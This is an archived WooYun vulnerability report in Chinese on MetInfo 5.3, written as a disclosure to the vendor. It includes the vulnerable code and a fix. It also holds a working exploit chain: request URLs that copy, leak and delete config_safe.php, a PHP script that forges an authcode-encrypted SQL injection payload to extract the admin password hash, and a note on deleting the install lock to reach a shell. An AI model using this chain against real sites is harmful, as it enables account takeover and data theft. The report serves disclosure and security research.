{"id": 88449, "wybug_id": "wooyun-2016-0193729", "wybug_title": "Metinfo 最新版前台注入一枚(可无需登陆,可直接出任意数据)                                      ", "wybug_corp": "MetInfo", "wybug_author": "′雨。", "wybug_date": "2016-04-08 14:26", "wybug_open_date": "2016-07-07 14:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-07：\t细节向公众公开  简要描述： 好久没挖洞拉, 今天@玉林嘎 带我挖的洞,感人。这个洞,能干的事情还有很多,不仅仅能注入。 详细说明：  在app\\system\\include\\module\\uploadify.class.php中\npublic function doupfile(){\t\tglobal $_M;\t\t$this->upfile->set_upfile();\t\t$info['savepath'] = $_M['form']['savepath'];\t\t$info['format'] = $_M['form']['format'];\t\t$info['maxsize'] = $_M['form']['maxsize'];\t\t$info['is_rename'] = $_M['form']['is_rename'];\t\t$info['is_overwrite'] = $_M['form']['is_overwrite'];\t\t$this->set_upload($info);\t\t$back = $this->upload($_M['form']['formname']);\t\tif($_M['form']['type']==1){\t\t\tif($back['error']){\t\t\t\t$back['error'] = $back['errorcode'];\t\t\t}else{\t\t\t\t$backs['path'] = $back['path'];\t\t\t\t$backs['append'] = 'false';\t\t\t\t$back = $backs;\t\t\t}\t\t}\t\techo jsonencode($back);\t}\n可以看到 什么上传的路径啊  都是可控的。。跟一下。\npublic function set_upload($info){\t\tglobal $_M;\t\t$this->upfile->set('savepath', $info['savepath']);\t\t$this->upfile->set('format', $info['format']);\t\t$this->upfile->set('maxsize', $info['maxsize']);\t\t$this->upfile->set('is_rename', $info['is_rename']);\t\t$this->upfile->set('is_overwrite', $info['is_overwrite']);\t}\n设置了一下属性。在看一下上传的地方\npublic function upload($form = '') {\t\tglobal $_M;\t\tif (is_array($form)) {\t\t\t$filear = $form;\t\t}else{\t\t\t$filear = $_FILES[$form];\t\t}\t\tif(!$filear){\t\t\tforeach($_FILES as $key => $val){\t\t\t\t$filear = $_FILES[$key];\t\t\t\tbreak;\t\t\t}\t\t}\t\t//是否能正常上传\t\tif(!is_array($filear))$filear['error'] = 4;\t\tif($filear['error'] != 0 ){\t\t\t$errors = array(\t\t\t\t0 => $_M['word']['upfileOver4'], \t\t\t\t1 => $_M['word']['upfileOver'], \t\t\t\t2 => $_M['word']['upfileOver1'], \t\t\t\t3 => $_M['word']['upfileOver2'], \t\t\t\t4 => $_M['word']['upfileOver3'], \t\t\t\t6 => $_M['word']['upfileOver5'], \t\t\t\t7 => $_M['word']['upfileOver5']\t\t\t);\t\t\t$error_info[]= $errors[$filear['error']] ? $errors[$filear['error']] : $errors[0];\t\t\treturn $this->error($errors[$filear['error']]);\t\t}\t\t//文件大小是否正确\t\tif ($filear[\"size\"] > $this->maxsize || $filear[\"size\"] > $_M['config']['met_file_maxsize']*1048576) {\t\t\treturn $this->error(\"{$_M['word']['upfileFile']}\".$filear[\"name\"].\" {$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}\");\t\t}\t\t//文件后缀是否为合法后缀\t\t$this->getext($filear[\"name\"]); //获取允许的后缀\t\tif (strtolower($this->ext)=='php'||strtolower($this->ext)=='aspx'||strtolower($this->ext)=='asp'||strtolower($this->ext)=='jsp'||strtolower($this->ext)=='js'||strtolower($this->ext)=='asa') {\t\t\treturn $this->error($this->ext.\" {$_M['word']['upfileTip3']}\");\t\t}\t\tif ($_M['config']['met_file_format']) {\t\t\tif($_M['config']['met_file_format'] != \"\" && !in_array(strtolower($this->ext), explode('|',strtolower($_M['config']['met_file_format']))) && $filear){  \t\t\t\t\treturn $this->error($this->ext.\" {$_M['word']['upfileTip3']}\");\t\t\t}\t\t} else {\t\t\treturn $this->error($this->ext.\" {$_M['word']['upfileTip3']}\");\t\t}\t\tif ($this->format) {\t\t\tif ($this->format != \"\" && !in_array(strtolower($this->ext), explode('|',strtolower($this->format))) && $filear) {  \t\t\t\t\treturn $this->error($this->ext.\" {$_M['word']['upfileTip3']}\");\t\t\t}\t\t}\t\t//文件名重命名\t\t$this->set_savename($filear[\"name\"], $this->is_rename);\t\t//新建保存文件\t\tif(stripos($this->savepath, PATH_WEB.'upload/') !== 0){\t\t\treturn $this->error($_M['word']['upfileFail2']);\t\t}\t\tif (!makedir($this->savepath)) {\t\t\treturn $this->error($_M['word']['upfileFail2']);\t\t}\t\t//复制文件\t\t$upfileok=0;\t\t$file_tmp=$filear[\"tmp_name\"];\t\t$file_name=$this->savepath.$this->savename;\t\tif (stristr(PHP_OS,\"WIN\")) {\t\t\t$file_name = @iconv(\"utf-8\",\"GBK\",$file_name);\t\t}\t\t\t\tif (function_exists(\"move_uploaded_file\")) {\t\t\tif (move_uploaded_file($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t} else if (copy($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t}\t\t} elseif (copy($file_tmp, $file_name)) {\t\t\t$upfileok=1;\t\t}\t\tif (!$upfileok) {\t\t\tif (file_put_contents($this->savepath.'test.txt','metinfo')) {\t\t\t\t$_M['word']['upfileOver4']=$_M['word']['upfileOver5'];\t\t\t}\t\t\tunlink($this->savepath.'test.txt');\t\t\t$errors = array(0 => $_M['word']['upfileOver4'], 1 =>$_M['word']['upfileOver'], 2 => $_M['word']['upfileOver1'], 3 => $_M['word']['upfileOver2'], 4 => $_M['word']['upfileOver3'], 6=> $_M['word']['upfileOver5'], 7=> $_M['word']['upfileOver5']);\t\t\t$filear['error']=$filear['error']?$filear['error']:0;\t\t\treturn $this->error($errors[$filear['error']]);\t\t} else {\t\t\t@unlink($filear['tmp_name']); //Delete temporary files\t\t}\t\t\t\t$back = '../'.str_replace(PATH_WEB, '', $this->savepath).$this->savename;\t\treturn $this->sucess($back);\t}\n基本都是可控的 。。  但是\nif ($_M['config']['met_file_format']) {\t\t\tif($_M['config']['met_file_format'] != \"\" && !in_array(strtolower($this->ext), explode('|',strtolower($_M['config']['met_file_format']))) && $filear){  \t\t\t\t\treturn $this->error($this->ext.\" {$_M['word']['upfileTip3']}\");\t\t\t}\t\t}\n可以的白名单限制了我们的filename 必须为jpg 之类的 没办法任意上传了。继续看下面的。\nif (function_exists(\"move_uploaded_file\")) {\t\t\tif (move_uploaded_file($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t} else if (copy($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t}\t\t}\n来看看$file_name的限制\n$name_verification = explode('.',$filename);\t\t\t$verification_mun = count($name_verification);\t\t\tif($verification_mun>2){\t\t\t\t$verification_mun1 = $verification_mun-1;\t\t\t\t$name_verification1 = $name_verification[0];\t\t\t\tfor($i=0;$i<$verification_mun1;$i++){\t\t\t\t\t$name_verification1 .= '_'.$name_verification[$i];\t\t\t\t}\t\t\t\t$name_verification1 .= '.'.$name_verification[$verification_mun1];\t\t\t\t$filename = $name_verification1;\t\t\t}\t\t\t$filename = str_replace(array(\":\", \"*\", \"?\", \"|\", \"/\" , \"\\\\\" , \"\\\"\" , \"<\" , \">\" , \"——\" , \" \" ),'_',$filename);\t\t\tif (stristr(PHP_OS,\"WIN\")) {\t\t\t\t$filename_temp = @iconv(\"utf-8\",\"GBK\",$filename);\t\t\t}\t\t\t$i=0;\t\t\t$savename_temp=str_replace('.'.$this->ext,'',$filename_temp);\t\t\twhile (file_exists($this->savepath.$filename_temp)) {\t\t\t\t$i++;\t\t\t\t$filename_temp = $savename_temp.'('.$i.')'.'.'.$this->ext;\t\t\t\t}\t\t\tif ($i != 0) {\t\t\t\t$filename = str_replace('.'.$this->ext,'',$filename).'('.$i.')'.'.'.$this->ext;\t\t\t\t}\t\t}\t\treturn $this->savename = $filename;\n这里的$file_name 是必须以.jpg结尾的。  而且之前的小数点都会被替换为_所以上传这个很蛋疼。。基本放弃了。但是呢\nif (function_exists(\"move_uploaded_file\")) {\t\t\tif (move_uploaded_file($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t} else if (copy($file_tmp, $file_name)) {\t\t\t\t$upfileok=1;\t\t\t}\t\t} elseif (copy($file_tmp, $file_name)) {\t\t\t$upfileok=1;\t\t}\n这里的$file_name 因为之前的限制 不能直接上传php但是我们看一下$file_tmp 怎么来的\t\t$file_tmp=$filear[\"tmp_name\"];再看看$filear又是咋来的\nif (is_array($form)) {\t\t\t$filear = $form;\t\t}else{\t\t\t$filear = $_FILES[$form];\t\t}\n可以看到 如果我们传递的是_FILES的话 那么这个tmp_name 肯定是不可控制的。但是上面 如果我们传递的是数组过来的话。 那么这个$filear就可控了。这里的move_uploaded_file 因为路径的原因会失败 那么就会进行copycopy($file_tmp, $file_name) 那么我们就可以复制任意的一个文件成一个jpg我们就可以复制配置文件成jpg 然后就可以看到配置文件的源码了。但是 很不幸的是。\nif (!$upfileok) {\t\t\tif (file_put_contents($this->savepath.'test.txt','metinfo')) {\t\t\t\t$_M['word']['upfileOver4']=$_M['word']['upfileOver5'];\t\t\t}\t\t\tunlink($this->savepath.'test.txt');\t\t\t$errors = array(0 => $_M['word']['upfileOver4'], 1 =>$_M['word']['upfileOver'], 2 => $_M['word']['upfileOver1'], 3 => $_M['word']['upfileOver2'], 4 => $_M['word']['upfileOver3'], 6=> $_M['word']['upfileOver5'], 7=> $_M['word']['upfileOver5']);\t\t\t$filear['error']=$filear['error']?$filear['error']:0;\t\t\treturn $this->error($errors[$filear['error']]);\t\t} else {\t\t\t@unlink($filear['tmp_name']); //Delete temporary files\t\t}\n如果文件上传成功后 会删掉我们的临时文件。这个是一个很正常的做法， 但是这时候我们的\"临时文件\"是我们网站的配置文件。 也会造成损失。当然 这里也会造成任意文件删掉,但是测试的时候发现应该是config/config_db.php设置了权限 是删不掉的 其他的文件都能删掉。进一步的利用 我们可以删掉install的lock 达到重装系统 最后getshell。但是毕竟造成的损失太大。  找一个损失小的又能造成高危漏洞的地方。在config/config_safe.php中 里面只有一行代码。<?php/*R06DdgYN29vdspLQPZU52tMjElhnGSQe*/?>这里面保存的是authcode函数 所用的key我们在读取这个文件之后 这个文件就会被删掉。我们再来看一下authcode函数\npublic function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0){\t\t$ckey_length = 4;  \t\t\t\t$key = md5($key ? $key : UC_KEY);\n这时候因为config_safe.php被删掉了(删掉了并不会影响网站的正常运行),  那么$met_webkeys 就为空$key ? $key : UC_KEY 这里的判断 因为$key的空 那么结果就是UC_KEY但是也并没有UC_KEY这个常量 所以 UC_KEY就是一个字符串 我们的$key 就是md5后的UC_KEY我们就能获得任意字符串经过authcode后的加密字符串。再来找一下能在解密后利用的地方。在app\\system\\web\\user\\profile.class.php中\npublic function dosafety_emailadd() {\t\tglobal $_M;\t\tif($_M['form']['p']){\t\t\t$auth = load::sys_class('auth', 'new');\t\t\t$email = $auth->decode($_M['form']['p']);\t\t\tif($email){\t\t\t\tif($this->userclass->editor_uesr_email($_M['user']['id'], $email)){\t\t\t\t\tokinfo($_M['url']['profile_safety'], $_M['word']['bindingok']);\n\npublic function decode($str, $key = ''){\t\treturn $this->authcode($str, 'DECODE', $this->auth_key.$key);\t}\n这里我们$email 是对我们传递进来的变量解密后获得的 \npublic function editor_uesr_email($userid, $email){\t\tglobal $_M;\t\tif(!$userid){\t\t\treturn false;\t\t}\t\tif($this->get_user_by_email($email)){\t\t\treturn false;\t\t}\t\t$query = \"UPDATE {$_M['table']['user']} SET email = '{$email}' WHERE id = '{$userid}' \";\t\tDB::query($query);\t\treturn true;\t}\n然后就直接带入了查询。这里的话 有两种方式获取数据。1: 我们自己注册一个会员 然后update我们的email 直接出数据2: 不注册会员,直接延时盲注来获得数据。   漏洞证明：  演示下流程第一步http://localhost/metinfo5.3/app/system/entrance.php?c=uploadify&a=doupfile&savepath=../&formname[]=file&formname[name]=yu.jpg&formname[tmp_name]=../../config/config_safe.php&is_rename=0\n\n返回{\"error\":\"0\",\"path\":\"..\\/upload\\/..\\/yu.jpg\"}然后访问\n\n返回 <?php/*Ae2mhnCxNoWRBkQbVyJiIvjuxnJElnSJ*/?>然后写一个脚本\n<?php exit(authcode(\"',email=(select concat(admin_id,0x23,admin_pass) from met_admin_table limit 1) where username = 'xiaoyu'#\",'ENCODE'));\t\tfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0){\t\t\t\t$key = 'UC_KEY';\t\t$ckey_length = 4;  \t\t$key = md5($key ? $key : UC_KEY);\t\t$keya = md5(substr($key, 0, 16));\t\t$keyb = md5(substr($key, 16, 16));\t\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t\t$cryptkey = $keya.md5($keya.$keyc);\t\t$key_length = strlen($cryptkey);\t\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t\t$string_length = strlen($string);\t\t$result = '';\t\t$box = range(0, 255);\t\t$rndkey = array();\t\tfor($i = 0; $i <= 255; $i++) {\t\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t\t}\t\tfor($j = $i = 0; $i < 256; $i++) {\t\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t\t$tmp = $box[$i];\t\t\t$box[$i] = $box[$j];\t\t\t$box[$j] = $tmp;\t\t}\t\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t\t$a = ($a + 1) % 256;\t\t\t$j = ($j + $box[$a]) % 256;\t\t\t$tmp = $box[$a];\t\t\t$box[$a] = $box[$j];\t\t\t$box[$j] = $tmp;\t\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t\t}\t\tif($operation == 'DECODE') {\t\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\t   return substr($result, 26);\t\t\t} else {\t\t\t   return '';\t\t\t}\t\t}else{\t\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t\t}\t}\n然后访问一下这个文件\n\n得到86aeSfPSoF2GzlEZT/P/5SYZtef5kRNd/w5WSzvqnG5abewRENEPluivs1go/Qr%2bzOiZe1N7tFHFOrw5Z63TiaPuqT005coGkjt5H6u5gkHxXrkGo3DU0P7rb9InuTdquyY5Z//DiooyKPfwblSiyQ9WepGho1leUDPU2%2bhMXjAQfnx33pQ\n\n然后去注册一个号  xiaoyu xiaoyu\n\n再请求http://localhost/metinfo5.3/admin/index.php?m=web&n=user&c=profile&a=dosafety_emailadd&password=xx&p=86aeSfPSoF2GzlEZT/P/5SYZtef5kRNd/w5WSzvqnG5abewRENEPluivs1go/Qr%2bzOiZe1N7tFHFOrw5Z63TiaPuqT005coGkjt5H6u5gkHxXrkGo3DU0P7rb9InuTdquyY5Z//DiooyKPfwblSiyQ9WepGho1leUDPU2%2bhMXjAQfnx33pQ\n\n最后访问http://localhost/metinfo5.3/member/basic.php?lang=cn&a=dosafety\n\n   修复方案：  \t\tif (is_array($form)) {\t\t\t$filear = $form;\t\t}else{\t\t\t$filear = $_FILES[$form];\t\t}直接改成 $filear = $_FILES[$form]; 把。当然还有一些地方 自己看看咯。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-04-08 14:33 厂商回复： 感谢您的反馈，后续版本修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-08 14:28 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  雨牛出山了    \n     2016-04-08 14:29 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:289 漏洞数:64        | 新手上路。)\t\t \n  前排    \n     2016-04-08 14:32 |    \t\t玉林嘎  \t\t\t( 普通白帽子  |\t\t\t        Rank:956 漏洞数:109        )\t\t \n  明明是你带我挖的洞 再乱说    \n     2016-04-08 14:33 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 不会挖洞洞的猿猿不是好学生)\t\t \n  雨牛    \n     2016-04-08 14:34 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:67        | 不墨迹，才是时间管理和学习的最大利器与...)\t\t \n  雨牛回归了    \n     2016-04-08 14:40 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:99        | 别摸我，我怕热……  |  Tr3jer@Gmail.com ...)\t\t \n  确认的真快。。。    \n     2016-04-08 14:56 |    \t\tmyhalo \t\t\t( 普通白帽子  |\t\t\t        Rank:331 漏洞数:59        | T-Safe呼朋伴友。)\t\t \n  ....我擦    \n     2016-04-08 16:03 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:834 漏洞数:127        | 一个想当文人的黑客~)\t\t \n  不愧是我雨师傅！    \n     2016-04-08 16:23 |    \t\t卖女孩的小火柴 \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:11        | 动漫唱歌打球玩游戏)\t\t \n  前排    \n     2016-04-08 17:31 |    \t\tsunsama \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 爱生活爱geek)\t\t \n  雨神666    \n     2016-04-08 21:28 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:408 漏洞数:92        | JDSec)\t\t \n  厉害啊    \n     2016-04-09 18:59 |    \t\tAK-47 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:12        | 开开心心挖洞，踏踏实实上学！)\t\t \n  这个应该有$    \n     2016-04-12 22:42 |    \t\tL.N. \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | 不断进步····)\t\t \n  都不带我，@phith0n这个不要脸的天天欺负我    \n     2016-04-14 21:17 |    \t\tdragon110 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 其实我是龙6)\t\t \n  等等等    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}